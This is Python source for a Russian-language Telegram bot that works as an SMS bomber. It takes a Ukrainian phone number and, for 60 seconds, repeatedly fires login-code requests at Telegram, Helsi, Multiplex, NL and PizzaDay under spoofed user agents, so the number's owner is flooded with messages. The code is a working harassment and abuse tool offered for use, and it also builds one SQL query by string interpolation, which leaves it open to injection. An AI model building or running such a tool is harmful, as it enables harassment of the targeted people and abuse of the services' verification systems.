from aiogram import *
import fake_useragent
import asyncio
import logging
from aiogram import Bot, Dispatcher, executor, types
from aiogram.dispatcher import FSMContext
from aiogram.types import Message
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher.filters.state import State, StatesGroup
import sqlite3
import config
import aiohttp

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

ADMIN = 840987868

conn = sqlite3.connect('db.db')
cur = conn.cursor()
cur.execute("""CREATE TABLE IF NOT EXISTS users(
   user_id INTEGER,
   name TEXT,
   username TEXT,
   block INTEGER
);""")

storage = MemoryStorage()
bot = Bot(token=config.token)
dp = Dispatcher(bot, storage=storage)

async def anti_flood(*args, **kwargs):
    m = args[0]
    await m.answer("Хватит спамить!")

profile_button = types.KeyboardButton('📱Начать атаку')
referal_button = types.KeyboardButton('Помощь 💻')
profile_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True).add(profile_button, referal_button)

admin_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
admin_keyboard.add("Отправить сообщение пользователям")
admin_keyboard.add("Статистика бота")
admin_keyboard.add("Назад")

class Dialog(StatesGroup):
    spam = State()

async def add_user(user_id: int, name: str, username: str):
    cur.execute('INSERT INTO users(user_id, name, username, block) VALUES (?, ?, ?, ?)', (user_id, name, username, 0))
    profile_link = f'<a href="tg://user?id={user_id}">{name}</a>'
    await bot.send_message(ADMIN, f"Новый пользователь зарегистрировался в боте:\nИмя: {profile_link}", parse_mode='HTML')
    conn.commit()

@dp.message_handler(commands=['start'])
async def start(message: Message):
    cur.execute(f"SELECT block FROM users WHERE user_id = {message.chat.id}")
    result = cur.fetchone()
    if message.from_user.id == ADMIN:
        await message.answer('Введите команду /admin', reply_markup=profile_keyboard)
    else:
        if result is None:
            await add_user(message.from_user.id, message.from_user.full_name, message.from_user.username)
        await bot.send_message(message.chat.id, f"Приветствую, {message.from_user.first_name}\nВы в главном меню.", reply_markup=profile_keyboard)

@dp.message_handler(commands=['admin'])
async def admin(message: Message):
    if message.from_user.id == ADMIN:
        await message.answer(f'{message.from_user.first_name}, выберите действие👇', reply_markup=admin_keyboard)
    else:
        await message.answer('Вы не являетесь админом.')

@dp.message_handler(text='Статистика бота')
async def bot_stats(message: Message):
    if message.from_user.id == ADMIN:
        cur.execute('SELECT user_id, name, username FROM users')
        users = cur.fetchall()
        if users:
            text = f'<b>👷‍♂️Количество пользователей:</b> {len(users)}\n\n<b>Список:</b>\n'
            for user_id, name, username in users:
                text += f'<a href="tg://user?id={user_id}">{name or user_id}</a>'
                if username:
                    text += f' (@{username})'
                text += '\n'
            await message.answer(text, parse_mode="HTML")
        else:
            await message.answer('В боте нет зарегистрированных пользователей.')
    else:
        await message.answer("Недостаточно прав.")

@dp.message_handler(text='Отправить сообщение пользователям')
async def broadcast_prompt(message: Message):
    if message.from_user.id == ADMIN:
        await Dialog.spam.set()
        await message.answer('Введите сообщение для пользователей:')

@dp.message_handler(state=Dialog.spam, content_types=types.ContentType.TEXT)
async def broadcast_message(message: Message, state: FSMContext):
    text = message.text
    cur.execute('SELECT user_id FROM users')
    users = cur.fetchall()
    for user_id, in users:
        await bot.send_message(user_id, text)
    await message.answer('Сообщение отправлено!')
    await state.finish()

@dp.message_handler(text="Назад")
async def back_to_admin_menu(message: Message):
    if message.from_user.id == ADMIN:
        await message.answer('Введите номер телефона.\nПример:\n<pre>🇺🇦380xxxxxxxxx</pre>', parse_mode="html", reply_markup=profile_keyboard)
    else:
        await message.answer('Вы не являетесь админом.')

@dp.message_handler(text='Помощь 💻')
@dp.throttled(anti_flood,rate=3)
async def help(message: types.Message):
    inline_keyboard = types.InlineKeyboardMarkup()
    code_sub = types.InlineKeyboardButton(text='Разработчик👨‍💻', url='https://t.me/finake')
    inline_keyboard = inline_keyboard.add(code_sub)
    await bot.send_message(message.chat.id, "По всем вопросам, пишите  [разработчику](https://t.me/finake) 😉", disable_web_page_preview=True, parse_mode="MarkdownV2", reply_markup=inline_keyboard)


@dp.message_handler(text='📱Начать атаку')
@dp.throttled(anti_flood, rate=3)
async def start_attack_prompt(message: Message):
    await message.answer('Введите номер телефона.\nПример:\n<pre>🇺🇦380xxxxxxxxx</pre>', parse_mode="html", reply_markup=profile_keyboard)

async def send_request(url, data=None, json=None, headers=None, method='POST'):
    async with aiohttp.ClientSession() as session:
        if method == 'POST':
            async with session.post(url, data=data, json=json, headers=headers) as response:
                return response
        elif method == 'GET':
            async with session.get(url, headers=headers) as response:
                return response
        else:
            raise ValueError(f"Unsupported method {method}")

async def ukr(number):
    headers = {"User-Agent": fake_useragent.UserAgent().random}
    
    logging.info(f"Запуск атаки на номер {number}")

    try:
        response = await send_request("https://my.telegram.org/auth/send_password", data={"phone": "+" + number}, headers=headers)
        if response.status == 200:
            logging.info(f"Успех: Telegram - {number}")
        else:
            logging.error(f"Ошибка при попытке отправить код в Telegram для {number}")
    except Exception as e:
        logging.error(f"Ошибка при попытке отправить код в Telegram для {number}: {e}")
    
    try:
        response = await send_request("https://helsi.me/api/healthy/v2/accounts/login", json={"phone": number, "platform": "PISWeb"}, headers=headers)
        if response.status == 200:
            logging.info(f"Успех: Helsi - {number}")
        else:
            logging.error(f"Ошибка при попытке отправить код на Helsi для {number}")
    except Exception as e:
        logging.error(f"Ошибка при попытке отправить код на Helsi для {number}: {e}")
    
    try:
        response = await send_request("https://auth.multiplex.ua/login", json={"login": "+" + number}, headers=headers)
        if response.status == 200:
            logging.info(f"Успех: Multiplex - {number}")
        else:
            logging.error(f"Ошибка при попытке отправить код на Multiplex для {number}")
    except Exception as e:
        logging.error(f"Ошибка при попытке отправить код на Multiplex для {number}: {e}")
    
    try:
        response = await send_request("https://www.nl.ua/ua/personal/", data={"component": "bxmaker.authuserphone.login", "method": "sendCode", "phone": number, "registration": "N"}, headers=headers)
        if response.status == 200:
            logging.info(f"Успех: NL - {number}")
        else:
            logging.error(f"Ошибка при попытке отправить код на NL для {number}")
    except Exception as e:
        logging.error(f"Ошибка при попытке отправить код на NL для {number}: {e}")
    try:
        response = await send_request("https://api.pizzaday.ua/api/V1/user/sendCode", json={"applicationSend": "sms", "lang": "uk", "phone": number}, headers=headers)
        if response.status == 200:
            logging.info(f"Успех: PizzaDay - {number}")
        else:
            logging.error(f"Ошибка при попытке отправить код на PizzaDay для {number}")
    except Exception as e:
        logging.error(f"Ошибка при попытке отправить код на PizzaDay для {number}: {e}")
            

async def start_attack(number):
    timeout = 60
    start_time = asyncio.get_event_loop().time()
    
    while (asyncio.get_event_loop().time() - start_time) < timeout:
        await ukr(number)
        await asyncio.sleep(1)

    logging.info(f"Атака на номер {number} завершена через 60 секунд")

@dp.message_handler(content_types=['text'])
@dp.throttled(anti_flood, rate=3)
async def handle_phone_number(message: Message):
    number = message.text
    if len(number) == 12:
        await message.answer(f'🇺🇦Атака началась на номер <pre>{number}</pre>', parse_mode="html")
        asyncio.create_task(start_attack(number))
    else:
        await message.answer('Неправильный формат номера.')

if __name__ == '__main__':
    logging.info("Запуск бота...")
    executor.start_polling(dp, skip_updates=True)
